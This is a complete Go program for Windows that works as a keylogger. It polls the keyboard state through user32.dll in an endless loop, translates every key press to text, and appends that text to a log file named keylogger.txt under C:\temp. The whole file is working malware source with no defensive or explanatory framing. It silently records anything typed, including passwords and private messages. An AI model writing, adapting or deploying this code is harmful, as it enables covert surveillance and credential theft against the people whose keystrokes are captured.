package main

import (
	"fmt"
	"os"
	"time"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32           = windows.NewLazySystemDLL("user32.dll")
	getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	getKeyboardState = user32.NewProc("GetKeyboardState")
	mapVirtualKey    = user32.NewProc("MapVirtualKeyW")
	toUnicode        = user32.NewProc("ToUnicode")
)

const (
	mapVK       = 2
	logFilePath = "C:\\temp\\keylogger.txt"
)

func GetAsyncKeyState(vKey int) bool {
	ret, _, _ := getAsyncKeyState.Call(uintptr(vKey))
	return ret == 0x8001 || ret == 0x8000
}

func GetKeyboardState(lpKeyState *[256]byte) bool {
	ret, _, _ := getKeyboardState.Call(uintptr(unsafe.Pointer(lpKeyState)))
	return ret != 0
}

func MapVirtualKey(uCode uint, uMapType uint) uint {
	ret, _, _ := mapVirtualKey.Call(uintptr(uCode), uintptr(uMapType))
	return uint(ret)
}

func ToUnicode(wVirtKey uint, wScanCode uint, lpKeyState *[256]byte, pwszBuff *uint16, cchBuff int, wFlags uint) int {
	ret, _, _ := toUnicode.Call(
		uintptr(wVirtKey),
		uintptr(wScanCode),
		uintptr(unsafe.Pointer(lpKeyState)),
		uintptr(unsafe.Pointer(pwszBuff)),
		uintptr(cchBuff),
		uintptr(wFlags),
	)
	return int(ret)
}

func openLogFile(path string) (*os.File, error) {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		file, err := os.Create(path)
		if err != nil {
			return nil, fmt.Errorf("creating file: %w", err)
		}
		file.Close()
	}
	return os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0600)
}

func main() {
	file, err := openLogFile(logFilePath)
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	defer file.Close()

	var keyState [256]byte
	var buffer [2]uint16

	for {
		for ascii := 9; ascii <= 254; ascii++ {
			if GetAsyncKeyState(ascii) {
				if !GetKeyboardState(&keyState) {
					continue
				}

				virtualKey := MapVirtualKey(uint(ascii), mapVK)
				ret := ToUnicode(uint(ascii), uint(virtualKey), &keyState, &buffer[0], len(buffer), 0)

				if ret > 0 {
					runes := utf16.Decode(buffer[:ret])
					text := string(runes)
					file.WriteString(text)
				}

				time.Sleep(40 * time.Millisecond)
			}
		}
		time.Sleep(40 * time.Millisecond)
	}
}
